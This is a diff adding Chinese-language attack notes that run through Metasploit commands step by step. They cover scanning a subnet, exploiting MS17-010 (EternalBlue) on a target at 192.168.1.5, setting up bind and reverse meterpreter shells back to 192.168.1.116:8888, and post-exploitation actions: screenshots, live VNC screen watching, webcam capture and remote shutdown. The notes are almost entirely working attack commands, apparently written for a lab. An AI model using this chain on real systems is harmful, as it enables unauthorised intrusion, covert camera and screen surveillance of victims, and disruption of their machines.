@@ -1,0 +1,48 @@
+
+
+寻找靶机
+
+ifconig
+nmap 192.168.1.0/24  
+
+msfconsole                                                                  #进入msfconsole
+use auxiliary/scanner/smb/smb_ms17_010                #用来扫描漏洞
+show option                                                                 #查看需要设置的内容
+
+
+set rhosts 192.168.1.5     靶机
+run                                                   
+
+use exploit/windows/smb/ms17_010_eternalblue                #调用永恒之蓝攻击模块
+show option
+
+set rhost 192.168.1.5
+set payload windows/x64/meterpreter/bind_tcp                        #设置攻击载荷
+exploit                                                                                          #执行攻击
+
+验证：
+ipconfig
+
+
+
+****************************************8
+use exploit/multi/handler 
+
+
+show payloads
+
+set payload windows/meterpreter/reverse_tcp ​​  #设置攻击载荷
+
+show options   #设置要配置哪些信息
+
+set lhost 192.168.1.116     
+
+set lport 8888
+
+exploit
+
+
+screenshot:截图
+run vnc -i:监控靶机屏幕
+webcam_snap 靶机摄像头拍照
+Shutdown -s -t 60
